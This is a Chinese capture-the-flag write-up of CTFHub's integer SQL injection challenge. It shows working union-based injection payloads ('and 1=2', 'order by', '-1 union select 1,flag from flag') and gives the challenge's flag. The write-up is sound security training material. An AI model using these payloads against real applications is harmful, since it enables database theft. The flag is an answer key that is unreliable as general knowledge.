---
title: CTFHub-SQL注入-整数型注入 Writeup
date: 2026-09-27
category: Web
tags: [CTF, SQL注入, CTFHub, Web安全]
---
## 解题过程

打开题目页面，页面提示“输个1试试？”，URL 为 `http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1`。
输入 `1` 进行搜索，页面正常回显 `ID: 1` 和 `Data: ctfhub`，并且提示了后端的 SQL 语句为 `select * from news where id=1`。这表明是一个典型的整数型 SQL 注入。

### 第一步：验证注入与判断字段数
使用 `and` 判断注入是否生效：
- 输入 `1 and 1=1`，页面正常回显，SQL 语句变为 `select * from news where id=1 and 1=1`。
- 输入 `1 and 1=2`，页面报错或空白，说明存在 SQL 注入漏洞。

接下来使用 `order by` 判断当前表的字段数：
- 输入 `1 order by 1`，正常
- 输入 `1 order by 2`，正常
- 输入 `1 order by 3`，页面报错或空白
**结论**：当前表共有 2 个字段。

### 第二步：确定回显位置
使用联合查询来确定回显位，注意使用 `-1` 让前面的查询失效：
- 输入 `-1 union select 1,2`
- 页面回显 `ID: 1` 和 `Data: 2`
**结论**：第 1 个字段回显在 ID 处，第 2 个字段回显在 Data 处。

### 第三步：直接获取 Flag
由于 CTFHub 的平台环境通常比较直接，我们直接猜测表名和列名均为 `flag`。
- 输入 `-1 union select 1,flag from flag`
- 页面 Data 处成功回显 `ctfhub{...}`，直接拿到 Flag。

## Flag
ctfhub{3a7a168c4ed90e914b425276}
